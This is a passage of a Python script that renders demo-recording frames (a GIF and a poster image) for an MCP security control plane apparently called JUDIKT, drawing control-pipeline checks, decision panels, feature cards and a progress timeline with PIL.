        radius=16,
        fill=COLORS["panel"],
        outline=COLORS["border"],
        width=2,
    )
    draw.text((354, 245), "AGENT INTENT", font=fonts["tiny"], fill=COLORS["muted"])
    draw.text((354, 269), scene.intent, font=fonts["body"], fill=COLORS["text"])
    draw.text((936, 245), "MCP ROUTE", font=fonts["tiny"], fill=COLORS["muted"])
    _right_text(draw, (1192, 270), scene.tool, fonts["mono_small"], COLORS["blue"])

    draw.text((330, 350), "CONTROL PIPELINE", font=fonts["tiny"], fill=COLORS["muted"])
    check_width = 276
    for index, check in enumerate(scene.checks):
        x = 330 + index * (check_width + 20)
        active = phase >= 1
        fill = COLORS[f"{scene.accent}_dark"] if active else COLORS["panel"]
        outline = COLORS[scene.accent] if active else COLORS["border"]
        draw.rounded_rectangle(
            (x, 376, x + check_width, 426),
            radius=12,
            fill=fill,
            outline=outline,
            width=2,
        )
        marker = "OK" if active else ".."
        draw.text((x + 14, 393), marker, font=fonts["mono_small"], fill=outline)
        draw.text(
            (x + 48, 392),
            check,
            font=fonts["small"],
            fill=COLORS["text"] if active else COLORS["muted"],
        )

    decision_y = 454
    if phase < 2:
        draw.rounded_rectangle(
            (330, decision_y, 1218, 634),
            radius=18,
            fill=COLORS["panel"],
            outline=COLORS["border"],
            width=2,
        )
        status = "REQUEST RECEIVED" if phase == 0 else "EVALUATING CONTROLS"
        draw.text((360, 486), status, font=fonts["metric"], fill=COLORS["muted"])
        draw.text(
            (360, 538),
            "No upstream execution occurs until the pipeline resolves.",
            font=fonts["body"],
            fill=COLORS["muted"],
        )
    else:
        accent = COLORS[scene.accent]
        dark = COLORS[f"{scene.accent}_dark"]
        draw.rounded_rectangle(
            (330, decision_y, 1218, 634), radius=18, fill=dark, outline=accent, width=2
        )
        draw.text((356, 476), scene.decision, font=fonts["metric"], fill=accent)
        _pill(draw, (700, 480), f"RULE  {scene.rule}", fonts["tiny"], scene.accent)
        _pill(draw, (1000, 480), f"RISK  {scene.risk}", fonts["tiny"], scene.accent)
        draw.line((356, 526, 1192, 526), fill=COLORS["border"], width=1)
        for index, line in enumerate(scene.result_lines):
            x = 356 + (index % 2) * 418
            y = 548 + (index // 2) * 31
            draw.text((x, y), line, font=fonts["mono_small"], fill=COLORS["text"])
        draw.text((356, 608), scene.evidence, font=fonts["tiny"], fill=COLORS["muted"])

    draw.text(
        (330, 660), scene.evidence, font=fonts["mono_small"], fill=COLORS["muted"]
    )
    draw.text(
        (1218, 660),
        f"{scene.number:02d} / {len(scenes):02d}",
        anchor="ra",
        font=fonts["mono_small"],
        fill=COLORS["muted"],
    )
    progress = ((scene.number - 1) * 3 + phase + 1) / (len(scenes) * 3 + 2)
    _timeline(draw, progress)
    return image


def render_outro(
    scenes: list[Scene], fonts: dict[str, ImageFont.FreeTypeFont]
) -> Image.Image:
    image, draw = base_canvas()
    _brand(draw, fonts)
    _pill(draw, (72, 112), "END-TO-END VERIFIED", fonts["small"], "green")
    draw.text(
        (72, 164),
        "Production controls, visible outcomes.",
        font=fonts["hero"],
        fill=COLORS["text"],
    )
    draw.text(
        (74, 238),
        "The recording was rendered from the same runtime paths used by the test suite.",
        font=fonts["subtitle"],
        fill=COLORS["muted"],
    )
    cards = [
        ("REQUEST", "Policy + identity\nRisk + rate limits", "blue"),
        ("EXECUTION", "Approval + dry run\nKill switches", "amber"),
        ("RESPONSE", "Injection scan\nSecret redaction", "red"),
        ("EVIDENCE", "Signed audit\nMetrics + correlation", "green"),
    ]
    for index, (heading, body, accent) in enumerate(cards):
        x = 72 + index * 286
        draw.rounded_rectangle(
            (x, 320, x + 258, 498),
            radius=18,
            fill=COLORS["panel"],
            outline=COLORS[accent],
            width=2,
        )
        draw.text((x + 22, 344), heading, font=fonts["tiny"], fill=COLORS[accent])
        draw.multiline_text(
            (x + 22, 386), body, font=fonts["body"], fill=COLORS["text"], spacing=10
        )
    draw.rounded_rectangle(
        (72, 548, 1208, 621),
        radius=16,
        fill=COLORS["green_dark"],
        outline=COLORS["green"],
        width=2,
    )
    _center_text(
        draw,
        (72, 548, 1208, 621),
        f"{len(scenes) - 1} GUARDED CALLS + 1 INTEGRITY CHECK  |  "
        "REPRODUCE: make demo-recording",
        fonts["mono"],
        COLORS["green"],
    )
    _timeline(draw, 1.0)
    return image


def _brand(
    draw: ImageDraw.ImageDraw,
    fonts: dict[str, ImageFont.FreeTypeFont],
    compact: bool = False,
) -> None:
    x = 330 if compact else 72
    y = 30
    draw.rounded_rectangle((x, y, x + 42, y + 42), radius=10, fill=COLORS["green"])
    _center_text(draw, (x, y, x + 42, y + 42), "J", fonts["body"], COLORS["background"])
    draw.text((x + 56, y + 5), "JUDIKT", font=fonts["brand"], fill=COLORS["text"])
    if not compact:
        draw.text(
            (x + 214, y + 13),
            "MCP SECURITY CONTROL PLANE",
            font=fonts["tiny"],
            fill=COLORS["muted"],
        )


def _sidebar(
    draw: ImageDraw.ImageDraw,
    active: Scene,
    scenes: list[Scene],
    fonts: dict[str, ImageFont.FreeTypeFont],
) -> None:
    draw.rectangle((0, 0, SIDEBAR_WIDTH, HEIGHT), fill="#081622")
    draw.line((SIDEBAR_WIDTH, 0, SIDEBAR_WIDTH, HEIGHT), fill=COLORS["border"], width=2)
    draw.text((30, 36), "CONTROL WALKTHROUGH", font=fonts["tiny"], fill=COLORS["muted"])
    y = 82
    for scene in scenes:
        selected = scene.number == active.number
        if selected:
            draw.rounded_rectangle(
                (18, y - 10, 274, y + 40),
                radius=11,
                fill=COLORS[f"{scene.accent}_dark"],
            )
            draw.rectangle((18, y - 2, 22, y + 32), fill=COLORS[scene.accent])
        number_color = COLORS[scene.accent] if selected else COLORS["muted"]
        text_color = COLORS["text"] if selected else COLORS["muted"]
        draw.text(
            (36, y), f"{scene.number:02d}", font=fonts["mono_small"], fill=number_color
        )
        draw.text((72, y), scene.nav_title, font=fonts["small"], fill=text_color)
        y += 58
    draw.text((30, 640), "REAL RUNTIME DATA", font=fonts["tiny"], fill=COLORS["green"])
    draw.text(
        (30, 665),
        "No cloud calls. No secrets.",
        font=fonts["tiny"],
        fill=COLORS["muted"],
    )


def _pill(
    draw: ImageDraw.ImageDraw,
    position: tuple[int, int],
    label: str,
    font: ImageFont.FreeTypeFont,
    accent: str,
) -> None:
    x, y = position
    box = draw.textbbox((0, 0), label, font=font)
    width = box[2] - box[0] + 26
    height = 30
    draw.rounded_rectangle(
        (x, y, x + width, y + height),
        radius=15,
        fill=COLORS[f"{accent}_dark"],
        outline=COLORS[accent],
        width=1,
    )
    _center_text(draw, (x, y, x + width, y + height), label, font, COLORS[accent])


def _center_text(
    draw: ImageDraw.ImageDraw,
    box: tuple[int, int, int, int],
    text: str,
    font: ImageFont.FreeTypeFont,
    fill: str,
) -> None:
    left, top, right, bottom = box
    bounds = draw.textbbox((0, 0), text, font=font)
    width = bounds[2] - bounds[0]
    height = bounds[3] - bounds[1]
    draw.text(
        ((left + right - width) / 2, (top + bottom - height) / 2 - bounds[1]),
        text,
        font=font,
        fill=fill,
    )


def _right_text(
    draw: ImageDraw.ImageDraw,
    position: tuple[int, int],
    text: str,
    font: ImageFont.FreeTypeFont,
    fill: str,
) -> None:
    draw.text(position, text, anchor="ra", font=font, fill=fill)


def _wrapped_text(
    draw: ImageDraw.ImageDraw,
    text: str,
    position: tuple[int, int],
    max_width: int,
    font: ImageFont.FreeTypeFont,
    fill: str,
    spacing: int,
) -> None:
    words = text.split()
    lines: list[str] = []
    current = ""
    for word in words:
        candidate = f"{current} {word}".strip()
        if draw.textlength(candidate, font=font) <= max_width:
            current = candidate
        else:
            if current:
                lines.append(current)
            current = word
    if current:
        lines.append(current)
    draw.multiline_text(
        position, "\n".join(lines), font=font, fill=fill, spacing=spacing
    )


def _timeline(draw: ImageDraw.ImageDraw, progress: float) -> None:
    draw.rectangle((0, HEIGHT - 6, WIDTH, HEIGHT), fill="#10202D")
    draw.rectangle(
        (0, HEIGHT - 6, int(WIDTH * max(0.0, min(progress, 1.0))), HEIGHT),
        fill=COLORS["green"],
    )


def main() -> None:
    scenes, evidence = collect_scenes()
    output = ROOT / "docs" / "assets" / "judikt-demo.gif"
    poster = ROOT / "docs" / "assets" / "judikt-demo-poster.png"
    duration_ms = render_recording(scenes, output, poster)
    report = {
        "context_chapters": len(INFO_SLIDES),
        "execution_flow_chapters": 2,
        "scenes": len(scenes),
        "major_hold_seconds": MAJOR_HOLD_MS / 1000,
        "duration_seconds": round(duration_ms / 1000, 1),
        "audit_valid": evidence["audit_integrity"]["valid"],
        "signed_events": evidence["audit_integrity"]["checked_events"],
        "gif": str(output.relative_to(ROOT)),
        "gif_bytes": output.stat().st_size,
        "poster": str(poster.relative_to(ROOT)),
        "poster_bytes": poster.stat().st_size,
    }
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
